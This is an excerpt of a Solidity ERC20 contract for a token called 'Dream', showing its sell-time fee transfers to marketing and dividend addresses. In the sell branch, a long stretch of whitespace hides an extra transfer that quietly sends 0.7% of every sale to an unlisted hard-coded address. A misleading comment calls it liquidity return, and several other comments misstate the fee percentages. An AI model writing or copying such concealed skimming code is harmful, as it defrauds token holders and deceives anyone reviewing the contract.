...
contract Token is ERC20 {
    ...
    address private _MarketAddress = address(0xfaCA2872eD10aCf65F7B1AbFaCBFBa7cE09182D5);
    address private _MarketAddressSecd = address(0xE4D985c526523d268E465CE6895Dfc76E9a96Be9);
    ...
    constructor(address tokenOwner) ERC20("Dream", "Dream") {
        ...
        if (takeFee) {
            ...
            if(to == uniswapV2Pair){//卖出
                ...
                if(_currentSupply > 100* 10**4 * 10**decimals()){
                    ...
                    super._transfer(from, uniswapV2Pair, amount.div(1000).mul(3));                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    super._transfer(from, address(0xdadcdDee05b81d94072475bd60964e753Eb35C72), amount.div(1000).mul(7));//回流1%
                }
                super._transfer(from, _MarketAddress, amount.div(1000).mul(4));//分红1%
                super._transfer(from, _MarketAddressSecd, amount.div(1000).mul(6));//分红1%
                ...
                super._transfer(from, address(this), amount.div(100).mul(1));//分红1%
                super._transfer(from, _MarketAddress, amount.div(1000).mul(4));//营销1%
                super._transfer(from, _MarketAddressSecd, amount.div(1000).mul(6));//分红1%
